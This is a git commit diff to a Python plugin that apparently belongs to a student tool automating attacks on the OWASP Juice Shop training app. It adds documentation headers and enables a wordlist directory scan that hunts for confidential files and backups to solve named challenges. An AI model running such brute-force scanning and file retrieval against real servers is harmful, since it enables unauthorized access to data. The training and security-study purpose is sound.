60b149c45a056d14040f3158e46bb05276fce364
王喆 <wangzhe@d142-058-161-014.wireless.sfu.ca>
2022-12-08 12:25:58 -0800

    merge

--- plugins/access_log.py
+++ plugins/access_log.py
@@ -13,6 +13,18 @@ METHODOLOGY:
 3.1. scan the subnet using URL encoding of 00.md, 0.md
      0.pdf, 1.pdf by brute force
 """
+# SOURCE FILE:    access_log.py
+# PROGRAM:        JuiceShop automating attack application -- Plugin
+# FUNCTIONS:      Solve EASTER EGG, FORGETTEN DEVELOPER Backup, MISPLACED SIGNATURE FILE Challenge
+#                 Brute force scan the subnet to find the confidential files
+#
+# DATE:           Dec 6, 2022
+# REVISIONS:      N/A
+# PROGRAMMER:     Yoyo Wang
+#
+# NOTES
+#--------------------------------------------------------------------------------------
+
 import re
 from plugins import attack as a
 import json
@@ -21,26 +33,34 @@ from urllib import parse
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+#--------------------------------------------------------------------------------------
+#Class: access_file
+#Inherit: Attack
+#--------------------------------------------------------------------------------------
 class access_file(a.attack_inter):
 
+# --------------------------------------------------------------------------------------
+# FUNCTION: __init__
+# ARGUMENTS: N/A
+# RETURNS: void
+# Description: Initial class variables
+# --------------------------------------------------------------------------------------
     def __init__(self):
-        #self.url = a.URL+ "/ftp" ## you need to write brute force command to obtain this ftp
+        # REST session
         self.juice_session = a.requests.session()
 
     def generator(self):
         pass
 
-    def parse_html(self, string, subnet, tag):
-        print(tag)
-        pattern = '<a.*?href="({}/{}.+)".*?>(.*?)</a>'.format(subnet, tag)
-        try:
-            href = re.findall(pattern, string)
-            print(href)
-            idx = href[0][0].find('"')
-            #print(idx)
-            return href[0][0][:idx]
-        except:
-            print( '{} NOT find, please use other script').format(tag)
+#--------------------------------------------------------------------------------------
+#FUNCTION subnet_scan
+#ARGUMENTS: N/A
+#RETURNS: len_dict -> { length of the subnet: domain name of the subnet}
+#         E.g. {'11234': ftp, '300': api}
+#Description: This function is used to scan the subnet using different payload in common.txt
+#             Special cases are extracted according to the length of the response text.
+#NOTES:
+#--------------------------------------------------------------------------------------
 
     def subnet_scan(self):
         len_dict = {}
@@ -50,10 +70,32 @@ class access_file(a.attack_inter):
             if line:
                 payload = a.URL + '/' + line[:-1]
                 response = self.juice_session.get(payload)
-                len_dict[str(len(json.dumps(response.text)))] = payload
+                len_dict[str(len(json.dumps(response.text)))] = line[:-1]
             else:
                 break
         return len_dict
+
+#--------------------------------------------------------------------------------------
+#FUNCTION parse_html
+#ARGUMENTS: string ->
+#           subnet -> subnet found by subnet scan
+#           tag ->
+#RETURNS: href[0][0][:idx]  --> will be embedded into POST request json field.
+#Description: This function is used to find the
+#
+#NOTES:
+#--------------------------------------------------------------------------------------
+    def parse_html(self, string, subnet, tag):
+        print(tag)
+        pattern = '<a.*?href="({}/{}.+)".*?>(.*?)</a>'.format(subnet, tag)
+        try:
+            href = re.findall(pattern, string)
+            print(href)
+            idx = href[0][0].find('"')
+            return href[0][0][:idx]
+        except:
+            print( '{} NOT find, please use other script').format(tag)
+
 
     def find_confidential(self,subnet, confidential_tag):
         response = self.juice_session.get(a.URL+'/'+str(subnet))
@@ -75,7 +117,7 @@ class access_file(a.attack_inter):
 
 
     def run(self):
-        #subnet_list = [value for value in self.subnet_scan().values()]## using the subnet scan, we found 4 kinds of subnet, and we can open them manually, and in this case, we found that ftp is indeed useful.
+        subnet_list = [value for value in self.subnet_scan().values()]## using the subnet scan, we found 4 kinds of subnet, and we can open them manually, and in this case, we found that ftp is indeed useful.
         #subnet_list_modify = [i.replace('http://localhost:3000/','') for i in subnet_list]
         #print(subnet_list_modify)
         ## output = ['ver2', 'api', 'rest', 'ftp', 'profile', 'promotion', 'redirect', 'restaurants', 'restore', 'restored', 'restricted', 'robots.txt', 'snippets', 'support/logs']
